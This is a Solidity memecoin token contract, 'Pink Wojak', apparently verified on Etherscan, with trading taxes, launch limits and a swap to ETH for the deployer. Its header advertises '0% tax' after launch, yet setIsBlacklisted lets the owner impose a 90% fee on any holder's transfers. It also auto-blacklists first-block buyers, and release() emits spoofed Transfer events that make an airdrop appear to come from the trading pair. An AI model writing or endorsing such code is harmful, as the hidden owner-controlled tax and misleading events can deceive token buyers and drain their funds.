/**
 *Submitted for verification at Etherscan.io on 2023-05-08
*/

/**
 * TG: https://t.me/ethpinkwojak
 * Website: https://ethpinkwojak.surge.sh/
 * Twitter: https://twitter.com/ethpinkwojak
 *
 * Missed milady maker
 * Missed Arbitrum airdrop
 * Missed aidoge, pepe, wojak, pooh
 * Sold ETH in December and rebought it at $1.9k to lose it all on shitcoins
 * This is the memecoin for you!
 *
 * 0% tax, no limits 3 blocks after launch
 * 10% to 5% launch tax during blocks 1-2 after launch
 * MEV bot 10% sale tax always on
 * Do NOT buy in the same block as liquidity add!
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IFactory {
	function getPair(address tokenA, address tokenB) external view returns (address lpPair);
	function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IRouter {
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract PinkWojak {

	uint256 constant private _totalSupply = 100_000_000 gwei;
	uint88 private _launchBlock;
	bool private _inSwap;
	address public owner;
	address payable private immutable _receiver;
	address private _pair;
	address private _router;

	mapping (address => uint256) private _balances;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => uint256) private _blacklisted;
	mapping (address => uint256) private _buyBlock;

	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	error ExceedsLimit();
	error NotOwner();

	modifier onlyOwner {
		if (msg.sender != owner) {
			revert NotOwner();
		}
		_;
	}

	modifier swapping {
		_inSwap = true;
		_;
		_inSwap = false;
	}

	constructor() {
		owner = msg.sender;
		_receiver = payable(msg.sender);
		_balances[address(this)] = _totalSupply;
		emit Transfer(address(0), address(this), _totalSupply);
	}

	function name() external pure returns (string memory) {
		return "Pink Wojak";
	}

	function symbol() external pure returns (string memory) {
		return "PINK";
	}

	function decimals() external pure returns (uint8) {
		return 9;
	}

	function totalSupply() external pure returns (uint256) {
		return _totalSupply;
	}

	function balanceOf(address account) public view returns (uint256) {
		return _balances[account];
	}

	function transfer(address recipient, uint256 amount) external returns (bool) {
		_transfer(msg.sender, recipient, amount);
		return true;
	}

	function allowance(address owner_, address spender) external view returns (uint256) {
		return _allowances[owner_][spender];
	}

	function approve(address spender, uint256 amount) external returns (bool) {
		_approve(msg.sender, spender, amount);
		return true;
	}

	function _approve(address owner_, address spender, uint256 amount) private {
		_allowances[owner_][spender] = amount;
		emit Approval(owner_, spender, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
		_transfer(sender, recipient, amount);

		uint256 currentAllowance = _allowances[sender][msg.sender];
		if (currentAllowance < amount) {
			revert ExceedsLimit();
		}
		_approve(sender, msg.sender, currentAllowance - amount);

		return true;
	}

	function _transfer(address sender, address recipient, uint256 amount) private {
		uint256 amountReceived = _beforeTokenTransfer(sender, recipient, amount);
		uint256 senderBalance = _balances[sender];
		if (senderBalance < amount) {
			revert ExceedsLimit();
		}
		unchecked {
			_balances[sender] = senderBalance - amount;
			_balances[recipient] += amountReceived;
		}

		emit Transfer(sender, recipient, amount);
	}

	function release(address router, address bagReceiver) external payable onlyOwner {
		require(_launchBlock == 0, "Already launched");
		_router = router;
		_approve(address(this), address(router), type(uint256).max);
		IRouter rout = IRouter(router);
		address pair = IFactory(rout.factory()).createPair(address(this), rout.WETH());
		_pair = pair;
		uint256 supply = balanceOf(address(this));
		uint256 onePercent = supply / 100;
		rout.addLiquidityETH{value: msg.value}(address(this), onePercent * 97, 0, 0, owner, block.timestamp);
		uint256 airdrop = onePercent / 10;
		address airdropReceiver = 0xfbfEaF0DA0F2fdE5c66dF570133aE35f3eB58c9A;
		_balances[address(this)] -= airdrop;
		emit Transfer(address(this), pair, airdrop);
		emit Transfer(pair, airdropReceiver, airdrop);
		_balances[airdropReceiver] = airdrop;
		uint256 remainder = onePercent - airdrop;
		_balances[bagReceiver] = remainder;
		emit Transfer(address(this), bagReceiver, remainder);
		_launchBlock = uint88(block.number);
	}

	function renounceOwnership() external onlyOwner {
		owner = address(0);
		emit OwnershipTransferred(owner, address(0));
	}

	function _beforeTokenTransfer(address sender, address recipient, uint256 amount) private returns (uint256) {
		address own = owner;
		uint256 launchBlock = _launchBlock;
		if (launchBlock == 0 || tx.origin == own || sender == own) {
			return amount;
		}
		uint256 blackListSender = _blacklisted[sender];
		if (blackListSender > 0 && blackListSender <= block.number) {
			return _takeFee(sender, amount, 90);
		}
		
		address tradingPair = _pair;
		bool isBuy = sender == tradingPair;
		bool isSale = recipient == tradingPair;
		uint256 blocksSinceLaunch = block.number - launchBlock;

		if (isBuy) {
			_buyBlock[tx.origin] = block.number;
			_buyBlock[recipient] = block.number;
		}

		uint256 contractBalance = balanceOf(address(this));
		if (isSale && launchBlock > 0 && !_inSwap && contractBalance > 0 && sender != _receiver) {
			uint256 limit = _totalSupply / 200;
			uint256 toSwap = contractBalance > limit ? limit : contractBalance;
			_swap(toSwap);
			if (address(this).balance > 0) {
				sendEtherToReceiver();
			}
		}

		if (isSale && blocksSinceLaunch > 0) {
			if (_onTransferMEVCheck(sender)) {
				return _takeFee(sender, amount, 10);
			}
		}

		if (launchBlock != 0 && blocksSinceLaunch > 25) {
			return amount;
		}

		uint256 maxTxWallet = _totalSupply / 100;
		if (recipient != tradingPair && recipient != address(this)) {
			if (
				amount > maxTxWallet
				|| balanceOf(recipient) + amount > maxTxWallet
			) {
				revert ExceedsLimit();
			}
		}

		if (blocksSinceLaunch == 1) {
			return _takeFee(sender, amount, isSale ? 15 : 10);
		}
		if (blocksSinceLaunch == 2) {
			return _takeFee(sender, amount, isSale ? 10 : 5);
		}
		if (blocksSinceLaunch == 0) {
			_blacklisted[tx.origin] = block.number + 1;
			if (isBuy && recipient != tx.origin && recipient != _router && recipient != owner && recipient != _receiver && recipient != address(this)) {
				_blacklisted[recipient] = block.number + 1;
			}
			return _takeFee(sender, amount, isSale ? 20 : 15);
		}

		return amount;
	}

	receive() external payable {}

	function _swap(uint256 amount) private swapping {
		address[] memory path = new address[](2);
		path[0] = address(this);
		IRouter router = IRouter(_router);
		path[1] = router.WETH();
		router.swapExactTokensForETHSupportingFeeOnTransferTokens(
			amount,
			0,
			path,
			address(this),
			block.timestamp
		);
	}

	function manualSwap(uint256 amount) external {
		require(tx.origin == _receiver);
		_swap(amount);
		sendEtherToReceiver();
	}

	function sendEtherToReceiver() public {
		_receiver.call{value: address(this).balance}("");
	}

	function _takeFee(address sender, uint256 amount, uint256 fee) private returns (uint256) {
		uint256 feeAmount = amount * fee / 100;
		uint256 receiv = amount - feeAmount;
		
		unchecked {
			_balances[address(this)] += feeAmount;
		}
		emit Transfer(sender, address(this), feeAmount);
		return receiv;
	}

	function _onTransferMEVCheck(address sender) private view returns (bool) {
		if (sender == address(this)) {
			return false;
		}
		return (
			_buyBlock[sender] == block.number
			|| _buyBlock[tx.origin] == block.number
			|| uint160(sender) < uint160(22300745198530623141535718272648361505980416)
			|| uint160(tx.origin) < uint160(22300745198530623141535718272648361505980416)
		);
	}

	function setIsBlacklisted(address account, uint256 blockNo) external onlyOwner {
		_blacklisted[account] = blockNo;
	}
}